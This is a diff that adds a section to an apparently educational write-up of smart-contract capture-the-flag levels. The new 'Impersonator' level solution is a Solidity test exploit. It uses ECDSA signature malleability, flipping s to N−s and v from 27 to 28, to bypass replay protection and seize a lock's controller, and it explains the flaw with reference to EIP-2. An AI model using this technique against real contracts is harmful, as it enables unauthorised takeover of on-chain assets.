@@ -34,6 +34,7 @@
 - [29 Switch](#29-switch)
 - [30 Higher Order](#30-higher-order)
 - [31 Stake](#31-stake)
+- [32 Impersonator](#32-impersonator)
 
 <!-- /MarkdownTOC -->
 
@@ -2276,3 +2277,56 @@ contract AttackAssistant {
 
 * https://docs.openzeppelin.com/contracts/4.x/erc20
 * https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
+
+
+
+
+
+
+## 32 Impersonator
+
+To beat this level, we need to comply with
+
+```solidity
+ECLocker locker = instance.lockers(0);
+```
+
+### Solution
+
+```solidity
+function testExploit() public {
+  // In this challenge, we can change the lock's controller if we supply a valid signature
+  // whose (r, s, v) tuple has not been used before.
+  //
+  // Signature Malleability Attack:
+  // The vulnerability is that the contract does not enforce that `s` is in the lower half of the curve order,
+  // as required by EIP-2. This allows us to "flip" the `s` value (and adjust `v` accordingly) to create
+  // an alternative valid signature that bypasses the replay protection.
+
+  // value `r` (from the factory signature)
+  bytes32 r = bytes32(uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033));
+  // value `s` (from the factory and flipped)
+  bytes32 s = bytes32(SECP256K1_N - uint256(54405834204020870944342294544757609285398723182661749830189277079337680158706));
+  // value `v` (modified from 27 -> 28)
+  uint8 v = 28;
+
+  // Get the initial value
+  address lockerAddress = IImpersonator(challengeAddress).lockers(0);
+  assertEq(IECLocker(lockerAddress).controller(), 0x42069d82D9592991704e6E41BF2589a76eAd1A91);
+
+  // Execute the attack
+  IECLocker(lockerAddress).changeController(v, r, s, address(0));
+
+  // Check the new controller value
+  assertEq(IECLocker(lockerAddress).controller(), address(0));
+
+  // Submit the solution
+  utils.submitLevelInstance(challengeAddress);
+}
+```
+
+### References
+
+* https://github.com/ethereum/EIPs/blob/master/EIPS/eip-2.md
+  * All transaction signatures whose s-value is greater than `secp256k1n/2` are now considered invalid.
+  * Allowing transactions with any s value with `0 < s < secp256k1n`, as is currently the case, opens a transaction malleability concern, as one can take any transaction, flip the s value from `s` to `secp256k1n - s`, flip the v value (`27 -> 28`, `28 -> 27`), and the resulting signature would still be valid.
